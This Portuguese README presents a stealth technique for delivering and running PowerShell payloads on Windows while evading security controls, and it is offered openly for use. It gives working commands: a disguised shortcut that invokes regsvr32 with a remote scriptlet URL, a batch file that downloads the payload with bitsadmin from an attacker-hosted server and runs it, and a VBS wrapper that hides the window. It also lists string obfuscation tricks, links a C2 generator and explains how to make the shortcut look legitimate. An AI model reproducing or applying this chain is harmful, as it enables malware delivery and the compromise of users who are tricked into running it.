# Técnica de Execução Stealth para Scripts PowerShell

Este repositório demonstra técnicas avançadas para executar scripts PowerShell de maneira furtiva, contornando controles de segurança comuns. A implementação utiliza binários legítimos do Windows, transferência de arquivos em segundo plano e ofuscação para evitar detecção.

## Visão Geral

Esta técnica pode ser implementada de várias formas, incluindo o uso do `regsvr32.exe` para scriptlets (.sct) ou utilizando BITS (Background Intelligent Transfer Service), um serviço legítimo do Windows usado para downloads em segundo plano.

## Gerar o C2 em PS1

https://github.com/ticofookfook/C2-polimorfico

## Componentes e Técnicas

### 1. Técnica baseada em regsvr32 (SCT)

O ponto de entrada é um atalho do Windows com as seguintes propriedades:

```powershell
Destino: %windir%\System32\regsvr32.exe
Argumentos: /s /u /i:http://[ip-servidor]/[nome-script].sct scrobj.dll
Ícone: %SystemRoot%\System32\devmgr.dll,0
```

O arquivo SCT (Scriptlet) contém código JScript ofuscado com múltiplas técnicas de evasão.

## 2. Execução via script BAT e VBS

### Criar arquivo batch

```batch
@echo off
rem Executar silenciosamente
bitsadmin /transfer myDownloadJob /download /priority high http://[ip-servidor]/[nome-script].sct "%TEMP%\data.tmp" > nul
regsvr32 /s /u /i:"%TEMP%\data.tmp" scrobj.dll
exit
```

### Criar script VBS para execução oculta

```vbs
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd.exe /c ""%TEMP%\config.bat""", 0, False
```

## 3. Técnicas de Evasão

A implementação usa múltiplas camadas de evasão:

- **Inversão de Strings**: Strings como "powershell.exe" são armazenadas invertidas.
- **Conversão de Código de Caracteres**: Strings críticas construídas a partir de códigos ASCII.
- **Expansão de Variáveis de Ambiente**: Construção dinâmica de caminhos do sistema.
- **Uso de Serviços Legítimos**: BITS é um componente do Windows usado para Windows Update.

## 4. Cadeia de Execução

A cadeia completa de execução usando BITS:

1. O usuário clica no atalho.
2. `wscript.exe` executa o `.vbs` em segundo plano.
3. O `.vbs` chama `cmd.exe` para rodar o `.bat` sem exibição de janela.
4. O batch executa `bitsadmin` para baixar o payload.
5. `regsvr32` carrega o payload baixado.
6. O conteúdo é executado sem criar janelas visíveis.

## Uso

1. Hospede o arquivo `.sct` em um servidor HTTP.
2. Hospede seu payload PowerShell como `teste.ps1` no mesmo servidor.
3. Crie o atalho para o script VBS em vez do BAT.
4. O ícone e o nome do atalho podem ser personalizados para parecerem legítimos.

## Detalhes Técnicos

### BITSAdmin

- Ferramenta nativa do Windows para gerenciar o serviço BITS.
- Raramente bloqueada por soluções de segurança por ser essencial para o Windows Update.
- Permite downloads em segundo plano com alta confiabilidade.

### regsvr32

- `/s`: Execução silenciosa (sem diálogos).
- `/u`: Desregistra componente (usado como parte da técnica).
- `/i:<URL>`: Especifica o script a ser carregado.
- `scrobj.dll`: O Script Component Runtime que processa o scriptlet.

## Considerações de Segurança

Esta técnica é eficaz em contornar controles de segurança porque:

1. Utiliza binários confiáveis do Windows (técnica *living-off-the-land*).
2. BITS é um serviço essencial raramente bloqueado.
3. Comandos fragmentados e ofuscados previnem detecção.
4. A execução ocorre totalmente em segundo plano sem janelas visíveis.
5. Utiliza métodos de transferência legítimos usados pelo próprio Windows.
